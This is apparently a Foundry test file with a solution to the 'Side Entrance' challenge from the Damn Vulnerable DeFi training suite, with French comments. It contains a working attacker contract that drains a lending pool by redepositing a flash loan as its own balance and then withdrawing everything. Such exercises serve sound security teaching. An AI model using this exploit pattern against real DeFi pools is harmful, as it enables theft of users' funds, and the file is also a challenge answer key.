// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface ISideEntrancePool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    ISideEntrancePool private immutable pool;
    address payable private immutable recovery;

    constructor(ISideEntrancePool _pool, address payable _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // Lance l’attaque en UNE séquence: flashLoan -> deposit (dans execute) -> withdraw -> transfert
    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);    // ceci déclenchera execute() ci-dessous
        pool.withdraw();           // récupère tout l’ETH sur CE contrat

        // Envoi tout à recovery
        (bool ok, ) = recovery.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    // Appelée par le pool pendant le flashloan
    function execute() external payable override {
        // On redépose tout de suite le montant emprunté:
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}


contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Déploie le contrat d’attaque hors du prank si nécessaire, puis appelle une seule fois attack() en player
        vm.stopPrank();
        SideEntranceAttacker attacker = new SideEntranceAttacker(
            ISideEntrancePool(address(pool)),
            payable(recovery)
        );

        vm.startPrank(player, player);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
